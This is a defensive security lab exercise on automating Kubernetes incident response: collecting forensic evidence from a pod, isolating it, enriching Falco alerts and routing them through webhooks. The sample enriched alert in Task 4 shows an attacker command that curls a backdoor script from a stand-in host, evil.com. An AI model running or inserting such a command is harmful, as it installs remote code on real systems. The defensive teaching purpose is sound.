# Lab 5.1 — Incident Response Automation
**Phase**: 5 — Expert  
**Difficulty**: ⭐⭐⭐⭐ Expert  
**Estimated Time**: 4–5 hours  
**Category**: Incident Response, SOAR, Automated Playbooks

---

## 🎯 Objective

Build an **automated incident response pipeline** that detects a security event (via Falco, Trivy, or alerts), triggers a response playbook, performs initial containment, collects forensic evidence, and notifies the response team — all within minutes, not hours.

---

## 📋 Problem Statement

At 2:47 AM on a Saturday, Falco detects a shell spawned inside a production container. The on-call engineer's phone buzzes with a PagerDuty alert:

```
🚨 CRITICAL: Terminal shell detected in pod payment-api-7d8f9b
Namespace: production | Node: worker-03
Process: /bin/bash spawned by pid 1 (python3)
```

The engineer is groggy. They need to:
1. Verify the alert is real (not a false positive from a debugging session)
2. Capture the pod's process list, network connections, and filesystem state
3. Isolate the pod (remove from service but don't kill it — preserve evidence)
4. Identify what the attacker did
5. Determine blast radius (did they move laterally?)
6. Escalate to the security team

This takes 45 minutes manually. Your task: automate steps 1–5 so they happen in under 2 minutes, giving the human responder a forensic evidence package and a contained environment to investigate.

---

## 🛠️ Prerequisites

- Kubernetes cluster (Kind or Minikube)
- Falco deployed (Lab 3.4)
- kubectl configured
- Python 3.x or Go for automation scripts

---

## 📋 Tasks

### Task 1: Build the Forensic Evidence Collector

Create `forensic-collector.sh` that, given a pod name and namespace:

1. Captures the pod's current state:
   ```bash
   # Process list
   kubectl exec $POD -n $NS -- ps auxwwf
   
   # Network connections
   kubectl exec $POD -n $NS -- cat /proc/net/tcp
   kubectl exec $POD -n $NS -- ss -tulnp
   
   # Environment variables (may contain secrets!)
   kubectl exec $POD -n $NS -- env
   
   # Filesystem changes (diff from image)
   # Mount points and open files
   kubectl exec $POD -n $NS -- find / -newer /proc/1/exe -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
   ```

2. Captures Kubernetes metadata:
   ```bash
   # Pod spec and status
   kubectl get pod $POD -n $NS -o yaml
   
   # Events
   kubectl get events -n $NS --field-selector involvedObject.name=$POD
   
   # Logs (current + previous)
   kubectl logs $POD -n $NS --tail=500
   kubectl logs $POD -n $NS --previous --tail=500 2>/dev/null
   ```

3. Packages everything into a timestamped evidence bundle:
   ```
   evidence-2024-06-15T02:47:00Z/
   ├── pod-spec.yaml
   ├── processes.txt
   ├── network-connections.txt
   ├── filesystem-changes.txt
   ├── environment-vars.txt (REDACTED sensitive values)
   ├── pod-events.txt
   ├── pod-logs.txt
   ├── pod-logs-previous.txt
   └── evidence-manifest.json (timestamps, checksums, collector version)
   ```

### Task 2: Build the Pod Isolation Script

Create `isolate-pod.sh` that quarantines a pod WITHOUT destroying evidence:

1. **Remove from Service** — patch the pod's labels so it no longer matches any Service selector
2. **Apply NetworkPolicy** — create a deny-all NetworkPolicy targeting only this pod
3. **Add taint/annotation** — mark the pod as quarantined for humans
4. **Don't restart/delete** — the evidence is in the running container's memory and filesystem

The pod should be completely isolated (no network in/out) but still running so investigators can exec into it.

### Task 3: Automated Response Playbook

Create `playbooks/shell-in-container.py` — a Python script that orchestrates the full response:

```python
# Triggered by Falco alert webhook
# Input: Falco alert JSON payload
#
# Steps:
# 1. Parse alert — extract pod name, namespace, process details
# 2. Verify alert — check if pod is in an approved debugging session (suppress if so)
# 3. Collect forensic evidence — run forensic-collector.sh
# 4. Isolate the pod — run isolate-pod.sh
# 5. Check blast radius — query K8s API for pods on same node, same service account
# 6. Send enriched alert to Slack/PagerDuty with evidence summary
# 7. Create incident ticket (JIRA/GitHub Issue)
# 8. Log response actions to audit trail
```

### Task 4: Alert Enrichment

Before notifying the human responder, enrich the raw Falco alert with context:

1. **Who deployed this pod?** — look up deployment history via `kubectl rollout history`
2. **What image is running?** — get image digest, check if it's signed (Cosign verify)
3. **What service account?** — check RBAC permissions of the pod's service account
4. **What secrets are mounted?** — list all mounted secrets (DON'T read them — just names)
5. **Is the image vulnerable?** — run a quick Grype scan on the SBOM if available
6. **Has this alert fired before?** — query alert history for this pod/service

Format the enriched alert as a Slack message:
```
🚨 SECURITY INCIDENT — Shell in Container

Pod:        payment-api-7d8f9b (production)
Image:      registry.io/payment-api:v2.3.1 (sha256:abc123...)
Deployed:   2 hours ago by deploy-bot (CD pipeline)
Image Signed: ✅ Yes (Cosign keyless)
Service Acct: payment-api-sa (has access to: secrets/db-creds, secrets/stripe-key)

Process Tree:
  python3 (PID 1) → /bin/bash (PID 47) → curl http://evil.com/backdoor.sh (PID 52)

🔒 AUTOMATED RESPONSE:
  ✅ Evidence collected → s3://evidence-bucket/incident-20240615-0247/
  ✅ Pod isolated (NetworkPolicy applied, removed from Service)
  ✅ Blast radius: 3 other pods on same node, 0 with same service account
  ⚠️  Service account has access to 2 secrets — verify they weren't exfiltrated

📋 JIRA: SEC-1234 (auto-created)
👤 Assigned to: @oncall-security
```

### Task 5: Webhook Receiver & Response Orchestrator

Create a small HTTP server that:

1. Receives Falco alert webhooks (JSON POST)
2. Routes alerts to the appropriate playbook based on rule name:
   - `Terminal shell in container` → `shell-in-container.py`
   - `Read sensitive file untrusted` → `sensitive-file-access.py`
   - `Launch crypto miner` → `crypto-miner.py` (more aggressive — kill pod after evidence)
3. Logs all actions to an audit trail
4. Exposes a `/health` endpoint for monitoring

Deploy this as a Kubernetes service that Falcosidekick sends webhooks to.

### Task 6: Test the Full Pipeline

Simulate the attack from Lab 3.4 and verify the automated response:

1. Deploy a test application
2. Exec into the pod (triggers Falco)
3. Verify within 60 seconds:
   - Evidence bundle is created
   - Pod is isolated
   - Slack notification sent with enriched context
   - Incident ticket created
4. Measure **Mean Time to Contain (MTTC)** — time from alert to isolation

---

## 📝 Deliverables

1. `forensic-collector.sh` — evidence collection script
2. `isolate-pod.sh` — pod quarantine script
3. `playbooks/shell-in-container.py` — automated response playbook
4. `webhook-receiver/` — HTTP server for Falco webhook integration
5. `incident-report-template.md` — post-incident report template
6. `response-timeline.md` — documented MTTC measurement

---

## ❓ Questions to Answer

1. Why do we **isolate** a compromised pod instead of **deleting** it? What evidence would be lost?
2. Your automated response accidentally isolates a pod during a legitimate debugging session. How do you prevent this? How do you quickly undo it?
3. What is the legal/compliance requirement for **chain of custody** in forensic evidence? How does your evidence bundle maintain it?
4. An attacker gains access to the incident response automation itself. How do you protect the response pipeline from being tampered with?
5. What is the difference between **MTTD** (detect), **MTTC** (contain), and **MTTR** (remediate)? What's a good target for each?

---

> 💡 **The golden hour**: In incident response, the first 60 minutes are critical. Automated collection preserves volatile evidence (memory, network connections) that disappears if you wait for a human to respond.

> 📋 **NIST SP 800-61**: The NIST Incident Response lifecycle is: Preparation → Detection & Analysis → Containment, Eradication, Recovery → Post-Incident Activity. This lab automates Detection through Containment.

---

## 🔗 Useful Links & References

- [NIST SP 800-61 Rev. 2: Computer Security Incident Handling Guide](https://csrc.nist.gov/pubs/sp/800/61/r2/final)
- [Falco Documentation](https://falco.org/docs/)
- [Falcosidekick GitHub & Integrations](https://github.com/falcosecurity/falcosidekick)
- [Kubernetes Network Policies Guide](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [CISA Cybersecurity Incident Response Playbooks](https://www.cisa.gov/resources-tools/resources/federal-government-cybersecurity-incident-and-vulnerability-response-playbooks)
- [SANS Institute Incident Handler's Handbook](https://www.sans.org/white-papers/33393/)


